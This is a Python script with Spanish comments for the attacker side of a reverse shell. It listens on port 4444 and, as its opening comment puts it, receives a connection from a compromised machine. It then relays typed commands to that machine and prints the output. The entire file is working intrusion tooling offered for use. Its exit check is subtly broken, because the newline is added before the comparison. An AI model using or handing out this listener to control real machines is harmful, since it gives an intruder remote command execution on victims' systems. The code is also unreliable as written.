# Vamos a recibir la conexión de la máquina comprometida y proporcionarle un shell interactivo.

import socket

server_ip = "0.0.0.0"  # Escuchar en todas las interfaces de red
server_port = 4444     # Puerto en el que escucharemos
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Creamos un socket TCP
server_socket.bind((server_ip, server_port)) # Enlazamos el socket a la IP y puerto especificados
server_socket.listen(5) # Ponemos el socket en modo escucha, con un backlog (cola) de 5 conexiones
print(f"[+] Escuchando en {server_ip}:{server_port}...")

# Cuando recibamos una conexión, aceptamos y obtenemos el socket de la conexión y la dirección del cliente
client_socket, client_address = server_socket.accept() # Aceptamos la conexión entrante
print(f"[+] Conexión recibida de {client_address[0]}:{client_address[1]}") # Mostramos la dirección del cliente conectado

# Ahora se van a poder enviar y recibir datos a través de 'client_socket'
try:
    while True:
        command = input("shell> ") + "\n" # Solicitamos un comando al usuario
        if command.lower() in ["exit", "quit"]: # Si el comando es 'exit' o 'quit', cerramos la conexión
            print("[+] Cerrando conexión.")
            break
        client_socket.sendall(command.encode() + b'\n') # Enviamos el comando al cliente
        response = b""
        while True:
            chunk = client_socket.recv(4096) # Recibimos la respuesta del cliente en bloques de 4096 bytes
            response += chunk
            if len(chunk) < 4096: # Si el bloque recibido es menor a 4096 bytes, asumimos que es el final de la respuesta
                break
        print(response.decode()) # Mostramos la respuesta decodificada
except KeyboardInterrupt:
    print("\n[+] Interrumpido por el usuario. Cerrando conexión.")
finally: # Aseguramos que los sockets se cierren correctamente
    client_socket.close() # Cerramos el socket del cliente
    server_socket.close() # Cerramos el socket del servidor